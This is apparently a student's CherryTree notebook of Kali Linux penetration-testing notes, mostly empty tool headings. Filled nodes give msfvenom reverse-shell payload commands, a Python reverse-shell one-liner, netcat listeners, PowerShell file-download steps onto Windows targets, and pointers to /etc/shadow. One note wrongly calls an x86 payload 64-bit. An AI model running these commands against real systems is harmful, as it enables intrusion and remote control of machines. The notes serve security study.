@@ -1,0 +1,199 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Kali" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1620038304" ts_lastsave="1620043740">
+    <node name="Tools" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1620038318" ts_lastsave="1620094197">
+      <node name="Network Enum" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620038809" ts_lastsave="1620042180">
+        <node name="Nmap" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040566" ts_lastsave="1620040566"/>
+        <node name="MassScan" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040574" ts_lastsave="1620041171"/>
+        <node name="MetaSploit" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041186" ts_lastsave="1620041186"/>
+        <node name="Commands" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042180" ts_lastsave="1620042180"/>
+      </node>
+      <node name="Linux Enum" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620038821" ts_lastsave="1620042207">
+        <node name="Uploading" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040792" ts_lastsave="1620180139">
+          <rich_text>If you turn yourself in an HTTP server using python
+#python3 -m http.server &lt;port_number&gt;
+
+In windows. you can use Windows Powershell to wget a file from yourself.
+&gt;powershell -c wget "</rich_text>
+          <rich_text link="webs http://10.11.1.198/Advanced.exe&quot;">http://&lt;your_IP&gt;/&lt;File_name&gt;"</rich_text>
+          <rich_text> -outfile &lt;File_name&gt;
+
+or
+
+&gt;powershell -c</rich_text>
+        </node>
+        <node name="LinEnum" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040881" ts_lastsave="1620040881"/>
+        <node name="LinPEAS" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041437" ts_lastsave="1620041437"/>
+        <node name="LES" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041447" ts_lastsave="1620041447"/>
+        <node name="LinuxPrivChecker.py" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041465" ts_lastsave="1620041465"/>
+        <node name="User_enum" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042207" ts_lastsave="1620042207"/>
+      </node>
+      <node name="Windows Enum" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620038834" ts_lastsave="1620185419">
+        <node name="Responder" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040698" ts_lastsave="1620043147"/>
+        <node name="Kerbrute" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620159397" ts_lastsave="1620159397"/>
+        <node name="Rubeus" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620159414" ts_lastsave="1620159414"/>
+        <node name="Powerview" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620173449" ts_lastsave="1620173449"/>
+        <node name="Mimikatz" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620175780" ts_lastsave="1620175780"/>
+        <node name="Bloodhound" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620175791" ts_lastsave="1620175791"/>
+        <node name="Uploading" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620185419" ts_lastsave="1620187143">
+          <rich_text>Uploading a Payload in windows
+
+Try using scp on the kali box.  only works if you've got ssh access
+from kali #scp &lt;the file&gt; &lt;username&gt;@&lt;Ip address&gt;:. 
+and it should end up in their home directory
+
+you're attack box needs to be acting like a http server. so set that up first. 
+#python3 -m http.server &lt;port to listen on&gt;
+start this in the directory that the file is stored in.
+
+On the windows machine. try powershell.
+powershell -c “(new-object System.Net.WebClient).DownloadFile('http://&lt;Your IP&gt;/&lt;filename&gt;', ‘C:\&lt;where to put file\filename&gt;’)"
+
+</rich_text>
+        </node>
+      </node>
+      <node name="Hash" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040523" ts_lastsave="1620047711">
+        <node name="HashCat" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040533" ts_lastsave="1620055868">
+          <rich_text link="webs https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</rich_text>
+        </node>
+        <node name="John" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040540" ts_lastsave="1620055857">
+          <rich_text>/usr/share/john/</rich_text>
+          <node name="RAR/ZIP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620051695" ts_lastsave="1620051695"/>
+          <node name="Hash" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620055857" ts_lastsave="1620055857"/>
+        </node>
+        <node name="HashID/Identifier" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040550" ts_lastsave="1620055834">
+          <rich_text>/usr/share/hash-identifier
+it's a Python3 script.
+
+$python3 hash-id.py
+
+will open a program that you paste the hash into. 
+
+Once Identified either Hashcat or John the ripper can be used.
+using -m will give the mode needed for Hashcat.
+using -j will give the format needed in John
+
+multiple hashes can be checked by using a .txt file. 
+
+The Best Way to identify a Hash is to understand it's origin.  Where the Hash came from is the best way if Identifying a hash.
+/etc/shadow 
+
+
+</rich_text>
+          <rich_text link="webs https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text link="webs https://github.com/psypanda/hashID">https://github.com/psypanda/hashID</rich_text>
+        </node>
+        <node name="Decoding" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042408" ts_lastsave="1620042408"/>
+        <node name="WordLists." unique_id="66" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620047711" ts_lastsave="1620094167">
+          <rich_text link="webs https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</rich_text>
+          <rich_text>
+is installed at
+/usr/share/seclists/
+</rich_text>
+        </node>
+      </node>
+      <node name="MetaSploit" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040585" ts_lastsave="1620043604">
+        <node name="MSFVenom" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043551" ts_lastsave="1620185344">
+          <rich_text>To create a windows payload there are a few options
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+This makes a 64bit payload</rich_text>
+        </node>
+        <node name="Meterpreter" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043604" ts_lastsave="1620043604"/>
+      </node>
+      <node name="Searchsplot" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040599" ts_lastsave="1620079671">
+        <rich_text>The Exploit-DB offline Database.
+update weekly using $searchploit -u
+
+to search
+searchplot &lt;term1&gt; &lt;term2&gt; &lt;and so on&gt;
+
+exploits are found in /usr/share/exploitdb/exploits
+when searching use -p for the full path.
+can be run from there as well. 
+example:  $python3 /usr/share/exploitdb/exploits/php/webapps/&lt;exploit&gt; &lt;target_IP&gt;</rich_text>
+      </node>
+      <node name="Password" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040857" ts_lastsave="1620042232">
+        <node name="Hydra" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040862" ts_lastsave="1620040862"/>
+        <node name="Commands" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042232" ts_lastsave="1620042232"/>
+      </node>
+      <node name="SiteMaps" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040916" ts_lastsave="1620063244">
+        <node name="Dirbuster" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041110" ts_lastsave="1620041110"/>
+        <node name="dirsearch" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620063244" ts_lastsave="1620063244"/>
+      </node>
+      <node name="Scans" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040962" ts_lastsave="1620040972">
+        <node name="Nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040972" ts_lastsave="1620040972"/>
+        <node name="OpenVas" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040658" ts_lastsave="1620043072">
+          <node name="Installation" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043064" ts_lastsave="1620043064"/>
+          <node name="Operation" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043072" ts_lastsave="1620043072"/>
+        </node>
+        <node name="Nessus" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040641" ts_lastsave="1620043081">
+          <node name="Installation" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043056" ts_lastsave="1620043056"/>
+          <node name="Operation" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043081" ts_lastsave="1620043081"/>
+        </node>
+      </node>
+      <node name="Google_Dorking" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041060" ts_lastsave="1620041060"/>
+      <node name="Impacket" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620047386" ts_lastsave="1620047386"/>
+      <node name="SMB" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620047413" ts_lastsave="1620047435">
+        <node name="SMBClient" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041041" ts_lastsave="1620047419"/>
+        <node name="smbmap" unique_id="63" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620047435" ts_lastsave="1620047435"/>
+      </node>
+      <node name="SQL" unique_id="64" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620047453" ts_lastsave="1620056153">
+        <node name="SQLmap" unique_id="65" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620047470" ts_lastsave="1620047470"/>
+        <node name="sqlite3" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620056153" ts_lastsave="1620057282">
+          <rich_text>sqlite3 &lt;databse_name&gt;
+
+.tables looks at the tables
+
+once you've listed the tables, look at the information on said tables
+
+PRAGMA table_info(table_name);</rich_text>
+        </node>
+      </node>
+      <node name="Burp" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620094197" ts_lastsave="1620094197"/>
+    </node>
+    <node name="OS" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620038329" ts_lastsave="1620042296">
+      <node name="Networking" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620039022" ts_lastsave="1620043111">
+        <node name="TCPDump" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040677" ts_lastsave="1620040677"/>
+        <node name="Whois" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040714" ts_lastsave="1620040714"/>
+        <node name="Dig" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040723" ts_lastsave="1620040723"/>
+        <node name="NetCat" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040742" ts_lastsave="1620105202">
+          <rich_text>To listen for reverse shells use
+$nc -lvnp &lt;The port to listen on&gt;
+
+Listening on port 4444 is metasploits default. but this is known, so use something else?
+
+
+msfvenom -p windows/shell/reverse_tcp LHOST=10.2.68.72 LPORT=4444 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Your_ip&gt;",&lt;Your_port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
+        </node>
+        <node name="Socat" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040763" ts_lastsave="1620040763"/>
+        <node name="WireShark" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040823" ts_lastsave="1620040823"/>
+        <node name="Arp" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043111" ts_lastsave="1620043111"/>
+      </node>
+      <node name="Find" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620040895" ts_lastsave="1620040895"/>
+      <node name="Look_here" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620041019" ts_lastsave="1620041348">
+        <rich_text>/etc/passwd
+/etc/shadow
+</rich_text>
+      </node>
+      <node name="Kernal" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042285" ts_lastsave="1620042285"/>
+      <node name="Shells" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042296" ts_lastsave="1620042318">
+        <node name="Bind_Shell" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042307" ts_lastsave="1620042307"/>
+        <node name="Reverse_Shell" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620042318" ts_lastsave="1620042318"/>
+      </node>
+    </node>
+    <node name="Techniques" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1620043740" ts_lastsave="1620043782">
+      <node name="Linux" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043767" ts_lastsave="1620105148"/>
+      <node name="Windows" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043774" ts_lastsave="1620043774"/>
+      <node name="WEB" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620043782" ts_lastsave="1620049902">
+        <node name="OWASP" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620049902" ts_lastsave="1620049902"/>
+      </node>
+    </node>
+  </node>
+</cherrytree>
